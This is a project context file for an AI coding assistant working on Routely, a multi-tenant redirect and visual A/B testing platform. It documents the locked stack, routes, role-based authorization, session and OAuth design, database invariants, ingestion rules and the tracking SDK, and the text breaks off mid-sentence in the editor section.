# Routely — context for Claude

Read this before changing anything. It covers what the project is, the decisions that are
already settled, the invariants that must not be broken, and the things that will otherwise
cost you an hour to rediscover.

Claude Code loads this file automatically. It is also readable on its own if you are pasting
context into a fresh session.

---

## 1. What this is

A **redirect URL testing platform** — an A/B testing tool where the two variations are two
different URLs, not two versions of one page.

```
                    ┌─ 50% ─► /pricing      (control — visitor stays)
visitor ─► /pricing ┤                                                  ─► /thank-you = conversion
                    └─ 50% ─► /pricing-v2   (variant — redirected)
```

A customer adds a **website**, installs one tracking snippet on it, then creates
**experiments**. Each experiment has a control URL, a variant URL and a conversion URL. The
SDK on the customer's pages decides which arm each visitor is in, redirects the variant half,
and reports page views, visible time and conversions back.

Since the new-design backend (October 2026) there are two experiment **types**: `SPLIT_URL` (the
redirect test above, up to four variants) and `AB_TEST` (the visitor stays on the control URL and
each variant is a set of visual changes the SDK applies in the page). The UI calls a website a
**project**; the code, schema and URLs below still say `website` for the same row. Every website
belongs to a **workspace**, and people reach it through a membership with a role (§5).

Modelled on [Mida](https://mida.so). The user (`rakibul@blinto.co`) built this over a series
of numbered "Parts", each with its own spec, then built the new design's backend as work
packages WP0–WP10 (spec kept outside the repo).

---

## 2. Locked stack — do not substitute

The user declared this stack locked in the very first message. **Do not swap any of it** for a
different framework, ORM, database, auth provider or deployment approach without being asked.

| Concern | Choice | Version |
| --- | --- | --- |
| App | Next.js App Router + TypeScript, **one** full-stack project | `next@16.3.3`, `react@19.2.8` |
| UI | Tailwind CSS + shadcn/ui | `tailwindcss@4.3.3` |
| Auth | Auth.js + Google OAuth, plus email + password (see below) | `next-auth@5.0.0-beta.32` |
| Database | PostgreSQL | `postgres:17-alpine` |
| ORM | Prisma | `prisma@7.10.0` + `@prisma/adapter-pg` |
| SDK | Standalone vanilla TypeScript → one browser bundle | esbuild `0.28.2` |
| Deploy | Contabo VPS, Ubuntu, Docker, Compose, Nginx, Let's Encrypt | not built yet |

Additions made for tooling (not substitutions): **npm workspaces** (pnpm is not installed on
this machine), **Zod** for validation, **Vitest** for tests, **tsx** for CLI scripts.

Two additions the user decided on 2026-10-19, both inside the stack rather than beside it:

- **Email + password sign-in alongside Google.** Auth.js still owns Google sign-in with
  **database** sessions. Its Credentials provider only works with JWT sessions, so password
  sign-in does not go through Auth.js at all: `server/auth/password-session.ts` mints the same
  `sessions` row and `authjs.session-token` cookie the adapter would, and from the next request
  `auth()` cannot tell the two apart. Passwords are scrypt from `node:crypto` (`lib/password.ts`),
  no bcrypt/argon2 package. `docs/AUTH.md` has the detail.
- **Email through Resend, by plain `fetch`** (`server/email/resend.ts`) — no SDK dependency, the
  same stance as the hand-written Google calls. `RESEND_API_KEY`, `EMAIL_FROM`, `SUPPORT_EMAIL`.
  Without a key, development prints every email (links included) to the server console.

### Two pins that look wrong but are deliberate

- **`prisma@7.10.0`, not `latest`.** `latest` resolves to `8.0.0-rc.x` — a release candidate —
  while `@prisma/client` has no matching 8 release. 7.10.0 is the stable pair.
- **`next-auth@5.0.0-beta.32`, pinned exactly.** The `latest` tag is v4, which cannot call
  `auth()` in Server Components and therefore cannot protect App Router routes the way this app
  is structured. v5 is beta by version number but is what the App Router ecosystem runs on.
  Beta releases have shipped breaking changes, hence the exact pin.

---

## 3. Repository map

```
routely/
├── apps/web/                 Next.js dashboard + public API — the only deployable
│   ├── prisma/               schema.prisma, migrations/, seed.ts, verify.ts
│   ├── prisma7.config.ts     Prisma 7 CLI config (loads apps/web/.env via dotenv)
│   └── src/
│       ├── app/              routes (see §4)
│       ├── components/
│       │   ├── ui/           shadcn/ui primitives — generated, excluded from lint
│       │   ├── rt/           the design's own primitives: modal, popover menu, icons, toast host
│       │   ├── layout/       app shell, sidebar, account popover + workspace switcher, verify banner
│       │   ├── common/       page header, empty/error/loading states, field, step, code block
│       │   ├── auth/         login view, auth shell + account forms (sign-up, forgot/reset, verify)
│       │   ├── dashboard/  projects/  project-dashboard/   one directory per designed screen
│       │   ├── experiments-list/  experiment/   list; detail (results, review, share dialog)
│       │   ├── ab-test/      A/B wizard; visual-editor.tsx + live-editor/ (frame/popup bridge)
│       │   ├── split-url/  wizard-draft/   Split URL wizard; shared draft autosave hook
│       │   ├── settings/  integrations-catalog/   Settings tabs + invite dialog; /integrations
│       │   └── experiments/ metrics/ get-started/ websites/ integrations/
│       │                     pre-design components. Only integrations/google-picker.ts is still
│       │                     imported (by the Sheets dialog); the rest render nowhere now
│       ├── server/           server-only; never imported by a client component
│       │   ├── db.ts         the single PrismaClient (+ PrismaPg adapter)
│       │   ├── errors.ts     AppError taxonomy → HTTP status mapping (FORBIDDEN → 403)
│       │   ├── validate.ts   parseOrThrow — the only Zod → AppError bridge
│       │   ├── auth/         config, index, session (the seam), actions, adapter (workspace on
│       │   │                 sign-up), password-session, workspace, invite-cookie
│       │   ├── email/        resend.ts (fetch, never throws) + templates/ (11 emails)
│       │   ├── jobs/         result-ready, tracking-stopped, retention — run by the cron (§4)
│       │   ├── repositories/ one per table group; access.ts holds the tenant filters (§5)
│       │   ├── services/     account, team, website, project, dashboard, project-dashboard,
│       │   │                 experiment, experiment-results, visual-editor, ingest, analytics,
│       │   │                 tracking-check, pixel, notification, sheets-sync, google-oauth,
│       │   │                 google-sheets (+ pre-design overview, metrics)
│       │   ├── actions/      Server Actions: account, team, website, experiment, integration,
│       │   │                 share, pixel (+ pre-design metrics), types
│       │   ├── http/         rate-limit, bot-filter, safe-fetch (SSRF-guarded GET), viewer-time-zone
│       │   ├── crypto.ts     configured AES-GCM wrapper (pure cipher in lib/secret-box.ts)
│       │   └── editor-token.ts  configured wrapper for lib/editor-token.ts
│       ├── validation/       Zod: common, account, website, experiment, visual-change, editor,
│       │                     integration, tracking
│       ├── lib/              pure modules — routes, url, permissions, verdict, launch-rules,
│       │                     experiment-time, visitors, pixel-status, notifications, password,
│       │                     editor-protocol, google-oauth-state, sheets-card … and mock/ (§4)
│       ├── generated/prisma/ Prisma client output — GITIGNORED, regenerated on build
│       └── proxy.ts          Next 16's renamed middleware (optimistic auth check only)
├── packages/sdk/             the tracking SDK — vanilla TS, zero dependencies
│   ├── build.mjs             esbuild → dist/sdk.js, size-budgeted, publishes to apps/web/public
│   ├── src/                  see §7
│   └── test/                 15 suites, no DOM required (test/fake-dom.ts where one is needed)
├── infra/
│   ├── docker-compose.dev.yml    Postgres only (the app runs on the host)
│   └── nginx/conf.d/             app.conf, cdn.conf — production reference configs
└── docs/                     ARCHITECTURE, DATABASE, AUTH, SDK-DEPLOYMENT, INTEGRATIONS, DEPLOY-VERCEL
```

**Read the docs in `docs/` before large changes.** They carry the reasoning, not just the
shape — particularly `SDK-DEPLOYMENT.md`, which explains why time-on-page is approximate and
must be labelled as such wherever it appears.

---

## 4. Routes

| Route | Group | Notes |
| --- | --- | --- |
| `/` | — | Routes to `/dashboard` or `/login` |
| `/login` | `(auth)` | Google **and** email + password sign-in |
| `/signup` | `(auth)` | Password sign-up. `?invite=<token>` joins the inviting workspace instead of creating one |
| `/forgot-password`, `/reset-password/[token]` | `(auth)` | Reset by email link (1 h, single use). Reset signs out everywhere |
| `/verify-email/[token]` | `(auth)` | Spends the 24 h verification link on arrival |
| `/invite/[token]` | — | **Public.** Accept a team invite; the token (looked up by hash) is the credential |
| `/settings/email/confirm` | — | **Route handler.** Spends an email-change link, 303 → `/settings?emailChanged=`. Needs no session — `proxy.ts` lets it through |
| `/dashboard` | `(app)` | Workspace overview: 3 stat cards + projects with sparklines |
| `/projects`, `/projects/[projectId]` | `(app)` | Project list; project dashboard (tracking pixel, Sheets card, experiments) |
| `/experiments`, `/experiments/[experimentId]` | `(app)` | Experiment list; results & review. A DRAFT detail redirects to its wizard |
| `/experiments/new/ab-test`, `/experiments/new/split-url` | `(app)` | The two wizards. `?project=<id>` starts a draft, `?id=<draftId>` resumes one (`routes.experiments.wizard`) |
| `/integrations`, `/settings` | `(app)` | Integrations catalog (Sheets card); profile, password, sessions, team, notifications |
| `/websites/[id]`, `/get-started`, `/metrics`, `/metrics/[id]`, `/experiments/new` | `(app)` | **Redirects only** → project dashboard, `/dashboard`, `/experiments`, the experiment, the Split URL wizard |
| `/share/[token]` | — | **Public**, read-only results. No session. `noindex` |
| `/api/auth/[...nextauth]` | — | Auth.js handlers (Google), Node runtime |
| `/api/integrations/google/start` | — | **POST only.** Mints signed state (`workspaceId`, `returnTo`), redirects to Google |
| `/api/integrations/google/callback` | — | Verifies state, exchanges the code, stores the workspace's grant |
| `/api/editor/token` | — | **POST, JSON only, session required.** Issues a 30-min visual editor token |
| `/api/cron/sheets-sync` | — | Daily 00:20 UTC. Requires `Authorization: Bearer $CRON_SECRET` |
| `/api/cron/notifications` | — | Daily 00:40 UTC: result-ready backstop, tracking-stopped alerts, visitor-day retention. Same bearer rule |
| `/api/v1/config` | — | **Public.** Active experiments for a site id (`?v=4`; v3 document for older bundles) |
| `/api/v1/assign` | — | **Public.** A new visitor's arm, chosen and recorded by the server (balanced allocation, §6) |
| `/api/v1/events` | — | **Public.** Event ingestion (accepts `v` 3 or 4) |
| `/api/v1/hit` | — | **Public.** Site-wide page hit — tracking status, daily visitors, page baselines |

**Every screen is wired to real data.** The design prototype (github.com/RaihanSoft/routely-design-main,
one bundled `index.html`) was first implemented frontend-only on `src/lib/mock/*`; the backend work
packages then replaced each screen's mock source and simulated actions with services, keeping the
markup pixel-identical. What remains in `lib/mock/` is constants the screens still import (view
names, wizard defaults, the Login error copy) plus seeded data behind the design-review states —
the wizards' simulated mode, and a few fallbacks in the launch and Sheets dialogs
(`launchInfo`, `DRIVE_SHEETS`, `GS_EMAIL`).

**`?view=` after wiring** (`lib/view-param.ts`) opens a design state by the prototype's own name, so
it can still be compared with `#/<Component>/<view>`:

- **Purely visual states** (a dialog, a menu, a filter preset, the Integrations "Connecting…" card,
  a Settings tab) still open over the real data.
- **Data-driven states** (empty, loading, error, a particular result) were removed on the wired
  screens — they come from the real data now. Dashboard, Projects, Project dashboard and the
  Experiments list render their error states for real when a load fails.
- **The wizards** are the exception: `?view=<state>` **without** `?id=` keeps the design's seeded,
  simulated states for comparison; without `?view=` they are real drafts.

Route groups carry no URL segment. `(app)` owns the authorization boundary and the dashboard
chrome; `(auth)` is chrome-free. Pages the design did not include (sign-up, forgot/reset, verify,
invite) are built in the Login screen's visual style (decision D12).

The user's naming is **website**, not "site", in code and URLs; the UI says **project**.
`/experiments/[id]/edit` does not exist. A draft is edited in its wizard; once launched, only the
name and `trafficAllocation` may change, and only while paused (decision D7,
`updatePausedExperimentAction`) — at the time of writing no screen calls that action yet.

---

## 5. Architecture decisions already settled

Do not undo these without a reason. Each was chosen against a specific alternative.

### Tenancy: the workspace

Multi-tenant SaaS (user decision). The tenant is a **`Workspace`**; a website belongs to exactly
one (`Website.workspaceId`, which replaced `Website.userId`), and a user reaches it only through a
**`Membership`** with a role — `OWNER`, `ADMIN`, `EDITOR`, `VIEWER`. Every new account, Google or
password, gets "{First}’s workspace" with itself as OWNER, in the same transaction as the user row
— except an account created **through a valid invite**, which joins only the inviting workspace (no
orphan workspace). `User.currentWorkspaceId` is the active one; it is deliberately not a foreign
key, and the session seam re-checks membership on every request, falling back to the oldest
membership. The workspace switcher is a small menu in the sidebar account popover.

What each role may do is one pure table, **`lib/permissions.ts`** (`CAPABILITY_MIN_ROLE`, `can`,
`rolesWith`, `canDeleteExperiment`, `canManageMember`) — read it rather than restating it. In
short: Viewers read; Editors create, edit, launch, pause and end experiments, manage share links and
run pixel checks; Admins also manage projects, the team and the Sheets grant; only the Owner may
rename/delete the workspace or transfer ownership (none of which is built yet). Ownership is never
granted by invitation, nobody manages the Owner, and an Editor may delete only a DRAFT.

### Authorization is structural, not remembered

Every tenant-sensitive repository function takes the actor's `userId` and folds a **membership**
filter — and, for writes, the allowed **roles** — into the `where` clause. The filters are written
once, in `server/repositories/access.ts` (`workspaceAccess`, `websiteAccess`, `experimentAccess`).
Writes use `updateMany`/`deleteMany` so the filter participates in the write itself rather than
relying on a prior read.

**Two refusals, deliberately different** (a change from the single-user rule, which said "never
forbidden"):

| Actor | Gets | Why |
| --- | --- | --- |
| Not a member of the record's workspace | `NOT_FOUND` (404) | An id still cannot be probed for existence |
| A member whose role lacks the capability | `FORBIDDEN` (403, `server/errors.ts`) | Leaks nothing — they can already see the row — and the UI can say why |

The service checks the role first (to return FORBIDDEN), and the write's own filter carries the
roles again, so a forgotten service check still matches nothing. A record's role is the actor's
role **in that record's workspace**, which need not be the active one.

Server Actions re-establish the actor from the session and never trust an id in the form body.
A Server Action is a public HTTP endpoint.

### The session seam

`src/server/auth/session.ts` is the **only** module the rest of the app uses to learn who is
asking. Nothing outside `src/server/auth/` imports `next-auth`. It exposes:

- `getSession()` — nullable; memoised per request
- `requireSession()` — redirects to `/login` (pages and layouts)
- `requireUser()` — throws `AppError("UNAUTHENTICATED")` (actions and route handlers)
- `requireRole(min)` — `requireUser()` plus a minimum role **in the active workspace**, else
  `FORBIDDEN`. For workspace-level actions only (team, settings); a record-level action checks the
  role in the record's workspace in its service.

`SessionUser` is `{ id, name, email, image, sessionId, workspaceId, role }`. `sessionId` is the
`sessions` row (Settings marks "this device" with it); `workspaceId`/`role` are resolved per
request by `server/auth/workspace.ts` `resolveActiveMembership`, so removing a member or changing
a role takes effect on their next request. The dev bypass now resolves to a **real** `users` row
(`dev@routely.local`) with a real workspace.

### Two layers of route protection, one boundary

| Layer | Checks | Security boundary? |
| --- | --- | --- |
| `src/proxy.ts` | Session cookie **presence** | **No** — no database in that runtime |
| `(app)/layout.tsx` | Session **validity**, against the database | **Yes** |

Proxy exists only to preserve the destination in `?callbackUrl=` (a layout is never told the
request path) and to reject obviously-anonymous requests before rendering. The Next.js docs
warn against treating proxy as session management.

### Database sessions, not JWT

Costs one DB read per request; buys **revocation** — signing out deletes the row and the
session is dead immediately, which no signed token can offer. Settings → "Where you're signed in"
lists and revokes rows, and a password reset deletes them all.

That is why **password sign-in mints its own session** rather than using Auth.js Credentials
(JWT-only): `startPasswordSession` inserts the row (30-day expiry, the same
`SESSION_MAX_AGE_SECONDS` `config.ts` hands Auth.js) and sets `authjs.session-token` — or
`__Secure-authjs.session-token` when `AUTH_URL` is https — exactly as Auth.js would. Keep the two in
step if either changes. Session rows also carry `createdAt`, `lastSeenAt` (throttled
compare-and-set, 5 min), `userAgent`, `city`, `country` for the sessions list.

### `trustHost: true` **and** a required `AUTH_URL`

Only safe as a pair. Nginx delivers the Host via `X-Forwarded-Host` and Auth.js will not trust
it without `trustHost` — but `trustHost` alone permits host-header injection into callback
URLs. `env.ts` therefore requires `AUTH_URL` in production so callbacks are built from a
canonical origin.

### Service ↔ repository split

```
Route Handler / Server Action   HTTP + session only
        ↓
services/*.ts                   business rules; first argument is always actorUserId
        ↓
repositories/*.ts               queries only; tenant-sensitive fns take userId (+ roles)
        ↓
server/db.ts                    the only PrismaClient in the process
```

Rules that need data a Zod schema cannot see live in the **service**, not the schema — the
same-site rule needs the website's domain; the conflict rule needs the website's other
experiments.

Pure rules that several screens render live in **one `lib/` module each**, so no screen can drift:
`lib/verdict.ts` (results maths and copy, §7), `lib/launch-rules.ts` (setup issues and launch
summaries), `lib/experiment-time.ts` (day numbers, relative times), `lib/visitors.ts` (daily and
30-day visitors), `lib/pixel-status.ts` (tracking status), `lib/change-summary.ts` (describing a
visual change), `lib/permissions.ts`. Experiment lifecycle transitions (launch, pause, resume, end)
live only in `experiment.service.ts` and each writes an `ExperimentActivity` row in the same
transaction; launch and resume are serialised per website by an advisory lock.

### Background work: `after()`, latches and two daily crons

Nothing slow runs on a request path. Ingestion schedules the Sheets refresh and the result-ready
check with Next's `after()`; email is sent with `sendEmailAfter`/`runAfter`. Every "send once"
alert is a **compare-and-set latch** on its own column, taken *before* the email — so concurrent
triggers on any number of instances send one:

| Alert | Latch | Re-arms when |
| --- | --- | --- |
| A result is ready | `Experiment.resultReadyAt` (+ a partial unique index on the activity) | never — once per experiment |
| Tracking stops | `Website.trackingAlertSentAt` | a hit arrives after the alert |
| Sheets sync fails | `WebsiteSheetTarget.errorNotifiedAt` | the next successful write |

`notify(kind, workspaceId, payload, { excludeUserId, minRole })` (`notification.service.ts`) is
fire-and-forget and derives recipients from memberships and preferences — a trigger says what
happened where, never who to tell. Recipients must have a verified email (`emailVerified`, or a
linked Google account). `/api/cron/notifications` is the backstop and the only detector of an
*absence* (tracking stopped).

### Metrics have one source of truth each

Nothing is denormalised into a counter column that could drift:

| Metric | Derived from |
| --- | --- |
| Visitors per arm | `count(assignments)` grouped by `variantId` |
| Page views | `count(events)` where `type = 'page_view'` |
| Visible time | `sum(events.durationMs)` where `type = 'time_on_page'` |
| Conversions | `count(conversions)` grouped by `variantId` |
| Conversion rate | conversions ÷ **assigned** visitors |
| Site visitors per day | `count(website_visitor_days)` for that day — rows, not a counter |
| Visitors · 30 days | distinct `anonymousId` over 30 days (`lib/visitors.ts`, one function for every screen) |
| Page traffic baseline | `page_visitor_days` for the normalised URL |

`events` and `conversions` both carry `variantId`, so **aggregation never needs a join**.

Conversion rate uses assigned visitors as the denominator, not visitors who loaded a page:
everyone bucketed had the opportunity to convert, and the smaller denominator would inflate the
rate for whichever arm loses more visitors before rendering — exactly what a redirect test
measures.

### The Sheets integration: one grant per workspace, one spreadsheet per website

The workspace authorises Google **once** (`SheetsConnection`, unique on `workspaceId` — the grant,
nothing else; it was per user before the workspace migration moved it). Each **website** then
points at its own spreadsheet (`WebsiteSheetTarget`). Attaching one needs no consent screen because
the grant already exists, and a grant per website would hit Google's ~100 refresh-tokens-per-client
cap. Attaching is **optional**; a website with no target is not synced. Connecting, attaching,
creating and detaching need ADMIN (`sheets.manage`); "Sync now" needs EDITOR (`sheets.sync`).

**Only the member who connected Google may open the Picker** (`SheetsConnection.connectedById`).
The Picker runs on the grant's access token in the browser, so handing it to another member would
let them browse the connector's Drive; everyone else gets FORBIDDEN and the UI offers "create a new
sheet" instead, which needs no browsing. The consent flow's signed state carries the workspace and an
allow-listed `returnTo` (`/integrations` or `/projects/<id>`), so it lands back where it started.

**Scopes are all non-sensitive — `openid`, `userinfo.email`, `drive.file` — so Google requires no
verification review.** `drive.file` covers `spreadsheets.create` and `values.append` on files the app
created or the customer picked, because the Sheets API accepts Drive scopes. Do **not** re-add
`spreadsheets` (sensitive) or `drive.metadata.readonly` (restricted, plus a paid annual security
assessment); the first was replaced by `drive.file`, the second by the Google Picker. Consequence:
**Routely cannot list a customer's spreadsheets** — browsing is the Picker's job, and a
`files.list` under `drive.file` would return only files this app made. `include_granted_scopes` is
deliberately absent from the authorize URL, or the narrowing would never take effect for anyone who
granted the old scopes.

### The Sheets integration is a second OAuth flow, not the sign-in provider

Adding `spreadsheets` and `drive.metadata.readonly` to the Auth.js Google provider would force
every customer to grant Drive access **merely to sign in**, and `Account`'s
`@@unique([provider, providerAccountId])` means a second consent for the same Google account would
write over the sign-in row the adapter owns. So `/api/integrations/google/{start,callback}` is a
hand-rolled authorization-code flow writing to `sheets_connections`. No `googleapis` dependency —
four documented REST endpoints do not justify megabytes of transitive dependency, and the app's
only other outbound call is a hand-written `fetch` too.

The refresh token is the only value in this database that grants ongoing access to something
*outside* Routely, so it is the only value encrypted at rest (AES-256-GCM, `lib/secret-box.ts`).
`TOKEN_ENCRYPTION_KEY` is deliberately separate from `AUTH_SECRET`: rotating `AUTH_SECRET` signs
everyone out, whereas rotating this forces every customer to reconnect. With no key the integration
reports itself unavailable — it never stores a token in the clear.

`docs/INTEGRATIONS.md` carries the rest — why there is no claim mechanism (the tab is
overwritten from source, so a duplicated refresh is wasteful, never wrong), the failure latch and its
email, and the copy for the daily refresh.

---

## 6. Data model invariants

These constraints carry the product's guarantees. **Do not weaken them.**

| Constraint | Guarantees |
| --- | --- |
| `websites.publicSiteId` unique | The public identifier in the snippet is globally unique |
| `visitors (websiteId, anonymousId)` unique | One row per browser per website; concurrent requests converge |
| `assignments (experimentId, visitorId)` unique | **A visitor can never hold both arms** |
| `conversions.assignmentId` unique | **A refresh cannot inflate the conversion count** |
| `experiments.shareToken` unique | Safe to look up a public results page by token alone |
| `sheets_connections.workspaceId` unique | One Google *authorisation* per workspace (not a destination) |
| `website_sheet_targets.websiteId` unique | One spreadsheet per website |
| `memberships (workspaceId, userId)` unique | One role per person per workspace |
| `memberships_one_owner` — partial unique on `(workspaceId) WHERE role = 'OWNER'` | **At most one Owner per workspace** ("at least one" is a service rule) |
| `workspace_invites_pending` — partial unique on `(workspaceId, email) WHERE acceptedAt IS NULL AND revokedAt IS NULL` | One live invite per address per workspace; accepted and revoked ones are history |
| `experiment_activities_result_once` — partial unique on `(experimentId) WHERE type = 'RESULT_READY'` | A result is announced at most once, even if the latch were bypassed |
| `websites (workspaceId, domain)` unique, and `websites_ws_name_ci` on `(workspaceId, lower(name))` | One project per domain, and project names unique case-insensitively, per workspace |
| `website_visitor_days` PK `(websiteId, day, anonymousId)`, `page_visitor_days` PK `(websiteId, urlKey, day, anonymousId)` | A browser counts once per site (and per page) per UTC day; inserts are `ON CONFLICT DO NOTHING` |
| `tracking_checks (websiteId, urlKey)` unique | One latest snippet check per URL; a changed URL has a new key, so a stale check cannot vouch for it |
| `*.tokenHash` unique (invites, password resets, email changes) | Tokens are looked up by SHA-256 only; the raw token exists only in the emailed link |

The four partial / expression indexes cannot be written in `schema.prisma`; they are hand-written
at the end of `migrations/20261019120000_workspaces_and_new_design/migration.sql`, and nothing in
the schema file knows they exist. **Read every newly generated `migration.sql` for a `DROP INDEX`
of one of them** before committing (whether Prisma 7.10's diff emits one has not been checked), and
never use `db push`, which would not create them. `prisma/verify.ts` checks the owner, pending-invite
and RESULT_READY ones against the live database.

**Compare-and-set latches** (`resultReadyAt`, `trackingAlertSentAt`, `errorNotifiedAt`,
`WebsiteSheetTarget.refreshedAt`, `Website.lastSeenAt`, `Session.lastSeenAt`,
`Membership.lastActiveAt`) are written with the value read in the `where` clause. Do not turn any
of them into a read-then-write.

Enum values: `ExperimentStatus` (DRAFT/ACTIVE/PAUSED/COMPLETED — `ARCHIVED` was renamed in place to
`COMPLETED`), `ExperimentType` (SPLIT_URL/AB_TEST), `DeviceType` (DESKTOP/MOBILE/TABLET; an empty
list means every device), `MemberRole` (OWNER/ADMIN/EDITOR/VIEWER), `ExperimentActivityType`,
`NotificationKind` (RESULT_READY/TRACKING_STOPPED/SHEETS_SYNC_FAILED/EXPERIMENT_PAUSED),
`TrackingCheckResult`, `UrlMatchType` (EXACT/PREFIX), `SiteProtocol`, `PrimaryMetric`,
`SheetsConnectionStatus`, and `EventType` (`page_view`, `assignment`, `time_on_page`,
`conversion` — lowercase, because the user specified those names and they are the literal wire
strings the SDK sends, so no translation layer exists).

**There is no `Variant` enum.** An arm is a `variantId`: `NULL` is control, otherwise the
`ExperimentVariant` row the visitor was assigned. Control is deliberately not a variant row — it is
not a redirect target, and a row would duplicate `controlUrl` as a second source of truth. A
SPLIT_URL variant has a `url`; an AB_TEST variant has `changes` (`{ schemaVersion: 1, changes }`,
at most 50, validated by `validation/visual-change.ts`). At most four variants (`MAX_VARIANTS`).

Application-level rules enforced in `experiment.service.ts`:

- **Same-site rule.** Control, variant *and* conversion URLs must be on the website's domain or
  a subdomain. `isSameSite` is dot-anchored so `evil-acme.com` and `acme.com.evil.test` are both
  rejected. (The conversion URL was included beyond the original spec: a goal on another domain
  could never record anything, so allowing it would only create silent duds.)
  The design's Split URL wizard only *warned* about an off-domain URL; it is an error now (D9).
- **One active experiment per control URL.** Drafts are saved leniently (autosave, any step); the
  rule is enforced at **launch and resume**, inside a transaction holding a per-website advisory
  lock, so two launches cannot both pass. Comparison uses normalised URLs and accounts for PREFIX
  overlap. The design's "held back by an overlapping experiment" state was dropped (D6).
- **Launch rules** are computed only in `lib/launch-rules.ts` (`setupIssues`), and launch also
  requires a passed tracking check (≤ 24 h old, re-run inline if stale) for every page the test
  depends on.
- **The setup is fixed once an experiment has launched.** Visitors are already bucketed against
  it. While PAUSED, only the name and `trafficAllocation` may change (D7); URLs, arms, changes,
  devices, goal and weights stay locked. `COMPLETED` is terminal (End experiment, D5).
- **Traffic is split by weight, across any number of variants.** `Experiment.controlWeight` and
  each `ExperimentVariant.weight` are *relative* numbers normalised at draw time, kept separate
  from `trafficAllocation` so neither can drift from the other. `lib/traffic.ts` composes the
  two into percentages of total traffic for display, and `applyShare` is what the editor uses to
  set one of those percentages exactly while keeping the set at 100.

### Ingestion never trusts client-supplied ownership

`ingest.service.ts` — the only write path reachable without a session:

- The **website** comes from the public site id, never from a payload field
- Every **experiment** is re-checked against that website; only `ACTIVE` accepts events
- **The server chooses the arm** (`/api/v1/assign`, `lib/balance.ts`): a new visitor goes to the arm
  furthest below its configured share of *actual* assignments (deficit allocation, random tie-break),
  inside a transaction holding `pg_advisory_xact_lock` per experiment — so 25 visitors across five
  equal versions are 5 each, a 50/20/10/10/10 split over 20 is 10/4/2/2/2, and no arm is ever a whole
  visitor off its share, even under concurrent requests. An existing visitor gets their stored arm
  back and nothing is written. The SDK asks only when it has no stored arm, and a failed ask means
  "not entered" for that page load — never a browser-side guess. Balancing is separate from the
  verdict (`lib/verdict.ts`), which still names nothing below its gate. `/events` can still create an
  assignment from a claimed arm, for browsers running a cached older bundle; the balancer corrects any
  skew because it counts the rows that exist
- The **stored arm wins** over whatever the client claims
- **URLs are normalised server-side** — a URL over the network is an assertion, not a fact
- **Timestamps are clamped** (browser clocks are routinely hours off)
- **A conversion requires a pre-existing assignment** and must be on the configured goal URL.
  Other event types may *create* an assignment; a conversion may not — otherwise a forged
  request could invent a visitor, choose their arm, and convert them.
- **A site-wide hit** (`recordHit`) writes only visitor-day rows and `Website.lastSeenAt`, never a
  `Visitor`, and is dropped when its URL is not on the website's domain.
- **Device targeting is not verifiable server-side.** The SDK decides it in the browser and never
  reports an untargeted visitor; ingestion has nothing to check it against.

---

## 7. The SDK

`packages/sdk` — vanilla TypeScript, **zero runtime dependencies**, one IIFE bundle.
Currently **7.63 kB gzipped (20.94 kB raw) against an 8 kB budget the build enforces** (it exits
non-zero if exceeded; `npm run sdk:build`, 2026-10-22). The budget was 6 kB until the user raised it
for v4 (decision D3). Installation is two script tags — an inline anti-flickering block and the
tracking tag — pasted into `<head>`. The same pair works on every platform, which is what makes it
framework-independent:

```html
<script src="https://cdn.example.com/sdk.js" data-site-id="rt_abc123"></script>
```

In `<head>`, no `async`/`defer`, so the redirect decision precedes first paint.

| Module | Responsibility |
| --- | --- |
| `contract.ts` | Wire types shared with the API. Type-only, no runtime |
| `env.ts` | Guarded storage/cookie/crypto access. **Never throws** |
| `identity.ts` | Anonymous visitor id; layered persistence; cross-origin handoff |
| `url.ts` | Normalisation, EXACT/PREFIX matching, handoff params |
| `inclusion.ts` | `trafficAllocation` gate, drawn once and persisted, before any arm is drawn |
| `assignment.ts` | Stored arm, else the server's (`POST /api/v1/assign`), persisted so it is asked once; never guessed in the browser |
| `device.ts` | Desktop / mobile / tablet from the user agent, for device targeting |
| `redirect.ts` | The split-URL decision, four independent loop guards, `keepParams` carry-over |
| `apply.ts` | Applies an A/B variant's visual changes — text, background colour, image src/alt — bounded, never `innerHTML` |
| `hit.ts` | Site-wide page hit, at most once per normalised URL per UTC day per browser |
| `editor-bridge.ts` | `#_rt_edit=<token>` handshake with the Routely visual editor (below) |
| `conversion.ts` | Goal matching and once-per-assignment claiming |
| `engagement.ts` | Visible-time accumulator (`performance.now()`, delta reporting) |
| `dedupe.ts` | Page-view guard against repeated SDK initialisation |
| `cloak.ts` | Calls `window.__routelyReveal` — the overlay itself lives in the install snippet |
| `config.ts` / `transport.ts` / `track.ts` | Fetch + cache config (`?v=4`); timeouts; `sendBeacon` |
| `index.ts` | Options, boot sequence, orchestration |

### Protocol v4

`contract.ts` is the wire contract, imported by both sides. v4 adds to each experiment a `kind`
(`split_url` | `ab_test`), `devices` (`[]` = all), `keepParams` (carry the visitor's query string
and fragment to a split-URL variant) and, for A/B variants, `changes`. The SDK asks for `?v=4`; the
config route answers anything else (an installed v3 bundle sends no `v`) with a **v3 document that
omits A/B tests and device-targeted experiments**, which an old bundle would mis-serve. `/events`
accepts `v` 3 or 4. Device targeting is decided in the browser, before inclusion and the draw: an
untargeted visitor is never entered and nothing is reported for them.

An **A/B variant** stays on the page: its changes are applied as elements appear (one pass now,
again on DOM mutations, a last pass after `DOMContentLoaded`, hard stop at 10 s, at most 5
re-applications per change), and the anti-flicker overlay is **held until they are applied** — the
snippet's own timeout still bounds it. None of the redirect loop guards apply to A/B tests.

The **site-wide hit** (`POST /api/v1/hit`, `text/plain` via `sendBeacon`) is sent on every page
carrying the snippet, independently of the config request, so a site with nothing running still
shows as tracked.

### The visual editor bridge, and the agent that is not written yet

The editor opens the customer's **real page** (decision D4: no server-side proxy) in an iframe, or
a popup when the site forbids framing, with `#_rt_edit=<token>` (an HMAC token from
`POST /api/editor/token`, 30 min, bound to experiment, user and page origin). The SDK sees the
fragment, does nothing else on that load (no hit, config, assignment or events), reveals the page
and posts `routely:hello` to the parent/opener **addressed to the app origin**. Only on a matching
`routely:init` — right origin, right window, same token — does it load
`<app>/sdk/v1/editor-agent.js`, a separate bundle with its own 12 kB budget that does the actual
pointing, selecting and previewing. The token grants no data access; changes are saved through the
signed-in draft autosave.

**`packages/sdk/src/editor-agent.ts`** (written 2026-10-22 with the user's go-ahead; ~3.3 kB gzip)
picks the element under the pointer (button-like → image → heading → text with its own text),
builds a selector (`#id` for a hand-written unique id, else a stable-id ancestor or `body` plus a
`tag:nth-of-type(n)` chain, kept only if it resolves back), blocks clicks/submits so the session can't
navigate away, and previews by restoring snapshots then running the visitors' `applyChange`. It
checks origin, source window and token on every message. Verified in headless Chrome: iframe and
